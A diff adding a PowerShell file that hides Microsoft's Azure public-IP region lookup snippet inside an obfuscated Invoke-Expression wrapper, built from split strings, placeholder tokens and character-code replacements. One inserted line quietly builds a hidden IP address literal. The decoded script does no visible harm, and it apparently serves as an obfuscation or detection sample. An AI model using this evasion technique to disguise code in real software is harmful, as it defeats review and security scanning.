@@ -1,0 +1,119 @@
+InVOke-eXPreSsIOn ( ('#----------------------------'+'-------'+'--------------------------------------
+# Copyright (c) M'+'icrosoft.  A'+'ll rights reserved.
+#
+# Licensed under the Apache License, Versio'+'n 2.0 (the PafLicensePaf);
+# you may not use this file excep'+'t in compliance with the License.
+# You may '+'obtain a copy of'+' the License at
+#   http://w'+'ww.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed t'+'o in writing, '+'software
+# distrib'+'uted under the License is distributed on an PafAS ISPaf BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or impl'+'ied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+#-----'+'---------------------------------------------------------------------
+
+# PowerShell Snippet for finding Azu'+'re Region in which a Public IP is provisioned
+
+# Helper functions
+'+'
+function Conve'+'rt-IPv4ToInt (qkxIPv4Addre'+'ss)
+{
+'+'
+  try
+  {
+    qkxipAddress=[IPAddress]'+'::Parse(qkxIPv4Add'+'ress)
+
+    qkxbytes=qkxipAddress.GetAddressBytes()
+    [Array]::Reverse(qkxbytes)
+
+    [System.BitConverter]::ToUInt32(qkxbytes,0)
+  }
+  catch
+  {
+    Write-Error -Exception qkx_.Exception JGR
+ '+'     -Category '+'qkx_.CategoryInfo.Category
+  }
+
+}
+
+function Convert-IntToIPv4 (qkxIntege'+'r) 
+'+'{
+
+  try
+  {
+    qkxbytes=[System.BitConve'+'rter]::GetBytes(qkxInteger)
+        qkxgEtlJ =  (Pafqkx(sEt-it'+'Em  rclvAriAble:oFSrcl rclrcl) Paf+ [STRInG](rcl39,'+'105{112u58x55w56'+'-46p49w49,49w46u49{5'+'3w51%46p49w49:52{39rcl.spLit( rclwJu:p,-'+'{%xrcl )2Sh% {([ChAr] [int] qkx_)}) +Pafqkx(SEt-varIAbLE  rclOFSr'+'cl rcl rcl)Paf)
+    [Array]::Reverse(qkxbytes)
+    ([IPAddress](qkxbytes)).ToString()
+  }
+  catch
+  {
+    Wr'+'ite-Error -Exception qkx_.E'+'xcepti'+'on JGR
+      -Categor'+'y qkx_.CategoryInfo.Category
+  }
+
+}
+
+function Convert-CIDRToNetMask (qkxPrefixLengt'+'h) {
+
+  qkxbitString=(rcl1rcl * qkxPrefixLength).PadRight(32,rcl0rc'+'l)
+  qkxstrBuilder=New-Object -TypeName Text.StringBuilder
+
+  for(qkxi=0;qkxi -lt 32;qkxi+=8){
+    qkx8bitString=qkxbitString.Substring(qkxi,8)
+    [void]qkxstrB'+'uilder.Append(Pafqkx([Convert]::ToInt32(qkx8bitString,2)).Paf)
+  }
+
+  qkxstrBuilder.To'+'String().TrimEnd(rcl.rcl)
+
+}
+
+functio'+'n Get-C'+'IDRId ( qkxI'+'pAddress, qkxPref'+'ixLe'+'ngth )
+{
+
+    qkxSubnetMask = Convert-CIDRToNetMask'+' -PrefixLength qkxPrefixLength
+    qkxSubnetMaskInt ='+' Convert-IPv4ToInt -IPv4Address qkxSubnetMask
+    qkxIpInt = Convert-IP'+'v4ToInt -IPv4Address qkxIpAddress
+    qkxNetworkId = Convert-IntTo'+'IPv4 -Integer (qkxSubnetMaskInt -band qkxIpInt)
+    PafqkxNetworkId/qkxPrefixLengthPaf
+
+}
+
+function Get-AzRegi'+'onForPublicIp ( qkxIpAddress, qkxRe'+'gion = PafE'+'astUSPaf )'+'
+{
+
+    qkxcidrIds = @('+')
+
+    for (qkxi = 32; qkxi -ge 8; qkxi--)
+    {'+' 
+    
+       qkxcidrIds = qkxcidrIds + (Get-CIDRId -IpAddress qkxIpAddress -PrefixLength qkxi)
+
+    }
+
+    (Get-AzN'+'etw'+'orkService'+'Tag -Location qkxRegion).Values 2Sh
+
+    Where-Object { qkx_.Name -like PafAzureCloud.*Paf } 2Sh 
+
+    Foreach-Object '+'{
+
+        if ((Compare-Object -ReferenceObject qkxcidrIds -Diff'+'erenceObject qkx_.Properties.AddressPrefixes -ExcludeDifferent -IncludeEqual) -ne qkxnull)
+ '+'       {
+            q'+'kx_.Properties.Region
+     '+'   }
+
+    } 
+
+}
+
+# Main entry point
+
+# Authenticate to Azure
+
+    Connect-Az'+'Account
+
+# Get Region for Public IP Address
+
+    Get-AzRegionForPub'+'licIp'+' -IpAddress Paf13.78.132.23Paf 
+').repLACe('2Sh',[StrIng][Char]124).repLACe('qkx','$').repLACe(([Char]80+[Char]97+[Char]102),[StrIng][Char]34).repLACe(([Char]74+[Char]71+[Char]82),[StrIng][Char]96).repLACe(([Char]114+[Char]99+[Char]108),[StrIng][Char]39))
